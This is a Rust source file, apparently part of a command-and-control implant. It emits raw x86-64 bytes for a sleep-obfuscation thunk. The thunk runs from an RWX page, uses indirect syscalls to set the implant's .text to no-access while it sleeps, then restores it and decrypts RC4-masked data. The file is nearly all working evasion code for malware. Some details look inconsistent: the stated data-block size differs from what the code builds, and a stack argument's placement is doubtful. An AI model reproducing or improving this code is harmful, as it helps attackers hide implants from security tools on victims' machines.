//! Fluctuation thunk — pure position-independent x86-64 machine code.
//!
//! Built as raw bytes, no Rust function calls, no dependencies on .text.
//! Placed on a RWX page and executed via jmp (not call — CFG-safe).
//!
//! Layout: [48 bytes data] [~130 bytes code]
//! Data (R10-relative): trampolines, addresses, delay.
//!
//! ## Step 4 — in-thunk `mem::unmask()` (CRIT-5 fix)
//! After Step 3 restores `.text` to PAGE_EXECUTE_READ, the thunk calls
//! `mem::unmask()` INLINE before returning. This is the PRIMARY unmask path,
//! NOT the `MaskGuard` Drop in `fluctuation.rs` (which stays as defense-in-
//! depth for the normal early-`return` case).
//!
//! WHY the thunk must do it: while `.text` is PAGE_NOACCESS during the
//! `NtDelayExecution` sleep, any APC or hardware exception that touches a
//! `.text`-relative address raises `#PF`/`#AV`. Under `panic=abort` a hardware
//! exception terminates the process immediately — Drop NEVER runs, so the
//! registered data regions stay RC4-masked and the beacon dies/corrupts on the
//! next touch. By unmasking from the executable thunk page (which is always RX,
//! never NOACCESS) right after the `.text` RX restore, the data is guaranteed
//! decrypted before control returns to the beacon thread — regardless of any
//! exception that fired mid-sleep.
//!
//! The unmask call uses an ABSOLUTE `mov rax, imm64; call rax` (NOT R10-
//! relative) because the indirect syscall stubs each execute `mov r10, rcx`,
//! making R10 volatile across Steps 1-3. Absolute addressing is robust to
//! that clobber.
//!
//! ## Stack alignment (all 4 call sites)
//! The thunk is entered at RSP ≡ 8 (mod 16) (standard post-`call` ABI state),
//! so EVERY `call` inside the thunk — Steps 1, 2, 3 (the Nt* syscalls) AND
//! Step 4 (the inline `unmask`) — must `sub rsp, 0x28` (32-byte Win64 shadow
//! space + 8-byte realign) to make RSP ≡ 0 (mod 16) at the callee entry.
//! Using `0x20` instead leaves RSP ≡ 8 (mod 16) at the `call`, and any
//! callee `movaps`/`movdqa` on an aligned stack slot raises #GP/#PF — which
//! under `panic=abort` kills the implant on the first sleep. (v0.3.0 shipped
//! Steps 1-3 with the wrong `0x20` immediate; v0.3.1 corrects all three.)

#![cfg(target_os = "windows")]

use crate::heap::Vec;

pub const THUNK_MAX: usize = 200;

pub struct Thunk {
    pub bytes: Vec<u8>,
    pub len: usize,
}

/// Build fluctuation thunk bytes.
/// `protect_tramp` = VA of NtProtectVirtualMemory indirect-syscall stub
/// `delay_tramp`   = VA of NtDelayExecution indirect-syscall stub
/// `text_base`, `text_len` = .text region
/// `seconds` = sleep duration
/// `unmask_fn` = VA of `mem::unmask` (called inline after the RX restore — see
///               the crate-level "Step 4" note for why it must run in the thunk)
pub fn build(
    protect_tramp: usize,
    delay_tramp: usize,
    text_base: usize,
    text_len: usize,
    seconds: u32,
    unmask_fn: usize,
) -> Thunk {
    let delay: i64 = -((seconds as i64).saturating_mul(10_000_000));
    let mut b = Vec::with_capacity(THUNK_MAX);

    // ---- Data block (offsets from R10) ----
    // +0x00: protect_trampoline
    b.extend(&(protect_tramp as u64).to_le_bytes());
    // +0x08: delay_trampoline
    b.extend(&(delay_tramp as u64).to_le_bytes());
    // +0x10: &text_base → pointer to text_base (the address OF text_base)
    b.extend(&(text_base as u64).to_le_bytes());
    // +0x18: &text_len
    b.extend(&(text_len as u64).to_le_bytes());
    // +0x20: delay (i64, 100ns units, negative = relative)
    b.extend(&delay.to_le_bytes());
    // +0x28: old_prot (u32 scratch + 4 padding)
    b.extend(&0u32.to_le_bytes());
    // +0x2C: dummy (u32 scratch + 4 padding)
    b.extend(&0u32.to_le_bytes());
    // +0x30: unmask_fn (u64) — absolute VA of `mem::unmask`. Called inline after
    // Step 3 restores .text to RX (see "Step 4" crate doc). Absolute (not R10-
    // relative) because the syscall stubs clobber R10 (mov r10, rcx).
    b.extend(&(unmask_fn as u64).to_le_bytes());

    // Now we need to know: the data block ends at 0x38. The code starts at 0x38.
    // When the code executes, RIP = code_start = thunk_page + 0x38.
    // Data is at thunk_page. So data = RIP - 0x38.
    // LEA R10, [RIP - 0x38 - 7] where 7 = length of LEA instruction.

    let rel: i32 = -(0x38i32 + 7i32);

    // lea r10, [rip + rel]
    b.push(0x4C);
    b.push(0x8D);
    b.push(0x15);
    b.extend(&rel.to_le_bytes());

    // === Step 1: NtProtectVirtualMemory(-1, &base, &len, PAGE_NOACCESS=1, &old) ===
    // rcx = -1
    b.push(0x48);
    b.push(0xC7);
    b.push(0xC1);
    b.extend(&(-1i32).to_le_bytes());
    // rdx = r10 + 0x10
    b.push(0x49);
    b.push(0x8D);
    b.push(0x52);
    b.push(0x10);
    // r8 = r10 + 0x18
    b.push(0x4D);
    b.push(0x8D);
    b.push(0x42);
    b.push(0x18);
    // r9 = 1 (PAGE_NOACCESS)
    b.push(0x49);
    b.push(0xC7);
    b.push(0xC1);
    b.extend(&1u32.to_le_bytes());
    // [rsp+0x28] = r10 + 0x28 (&old_prot) — 5th arg on stack
    b.push(0x49);
    b.push(0x8D);
    b.push(0x42);
    b.push(0x28);
    b.push(0x48);
    b.push(0x89);
    b.push(0x44);
    b.push(0x24);
    b.push(0x28);
    // sub rsp, 0x28 (32-byte shadow + 8-byte realign → RSP ≡ 0 mod 16 at call;
    // the thunk is entered via indirect `call` so on entry RSP ≡ 8 mod 16 —
    // using 0x20 instead of 0x28 misaligns the stack at the `call` and any
    // callee `movaps`/`movdqa` raises #GP/#PF. See ABI note at module top.)
    b.push(0x48);
    b.push(0x83);
    b.push(0xEC);
    b.push(0x28);
    // call [r10]
    b.push(0x41);
    b.push(0xFF);
    b.push(0x12);
    // add rsp, 0x28
    b.push(0x48);
    b.push(0x83);
    b.push(0xC4);
    b.push(0x28);

    // === Step 2: NtDelayExecution(FALSE, &delay) ===
    // rcx = 0
    b.push(0x48);
    b.push(0x31);
    b.push(0xC9);
    // rdx = r10 + 0x20
    b.push(0x49);
    b.push(0x8D);
    b.push(0x52);
    b.push(0x20);
    // sub rsp, 0x28 (see Step 1 comment — same ABI realign)
    b.push(0x48);
    b.push(0x83);
    b.push(0xEC);
    b.push(0x28);
    // call [r10+8]
    b.push(0x41);
    b.push(0xFF);
    b.push(0x52);
    b.push(0x08);
    // add rsp, 0x28
    b.push(0x48);
    b.push(0x83);
    b.push(0xC4);
    b.push(0x28);

    // === Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy) ===
    // rcx = -1
    b.push(0x48);
    b.push(0xC7);
    b.push(0xC1);
    b.extend(&(-1i32).to_le_bytes());
    // rdx = r10 + 0x10
    b.push(0x49);
    b.push(0x8D);
    b.push(0x52);
    b.push(0x10);
    // r8 = r10 + 0x18
    b.push(0x4D);
    b.push(0x8D);
    b.push(0x42);
    b.push(0x18);
    // r9 = 0x20 (PAGE_EXECUTE_READ)
    b.push(0x49);
    b.push(0xC7);
    b.push(0xC1);
    b.extend(&0x20u32.to_le_bytes());
    // [rsp+0x28] = r10 + 0x2C (&dummy)
    b.push(0x49);
    b.push(0x8D);
    b.push(0x42);
    b.push(0x2C);
    b.push(0x48);
    b.push(0x89);
    b.push(0x44);
    b.push(0x24);
    b.push(0x28);
    // sub rsp, 0x28 (see Step 1 comment — same ABI realign)
    b.push(0x48);
    b.push(0x83);
    b.push(0xEC);
    b.push(0x28);
    // call [r10]
    b.push(0x41);
    b.push(0xFF);
    b.push(0x12);
    // add rsp, 0x28
    b.push(0x48);
    b.push(0x83);
    b.push(0xC4);
    b.push(0x28);

    // === Step 4: mem::unmask() — inline, BEFORE returning to the beacon ===
    // CRIT-5: this is the PRIMARY unmask path, NOT MaskGuard::drop. The RX
    // restore above has made .text executable again, so the beacon thread could
    // touch a masked data region the instant we return — unmasking must happen
    // HERE, on the (always-RX) thunk page, closing the hardware-exception
    // window described in the crate-level "Step 4" doc.
    //
    // Encoding: `mov rax, [r10+0x30]; sub rsp,0x28; call rax; add rsp,0x28`.
    // We deliberately do NOT rely on R10 holding the unmask VA directly — R10
    // points at the data block, and [r10+0x30] is the unmask_fn slot (absolute
    // VA, robust to the syscall-stub R10 clobber). `unmask` is idempotent
    // (MASK_STATE 1→0 CAS), so the later MaskGuard::drop unmask is a harmless
    // no-op — real defense in depth.
    //
    // rax = [r10 + 0x30]  (mov rax,[r10+disp8]: REX.W+B=0x49, 0x8B, modrm=0x42, disp8=0x30)
    b.push(0x49);
    b.push(0x8B);
    b.push(0x42);
    b.push(0x30);
    // sub rsp, 0x28 (32-byte shadow space + 8-byte realign so RSP ≡ 0 mod 16 at call)
    b.push(0x48);
    b.push(0x83);
    b.push(0xEC);
    b.push(0x28);
    // call rax
    b.push(0xFF);
    b.push(0xD0);
    // add rsp, 0x28
    b.push(0x48);
    b.push(0x83);
    b.push(0xC4);
    b.push(0x28);

    // === Return ===
    b.push(0xC3);

    let len = b.len();
    Thunk { bytes: b, len }
}
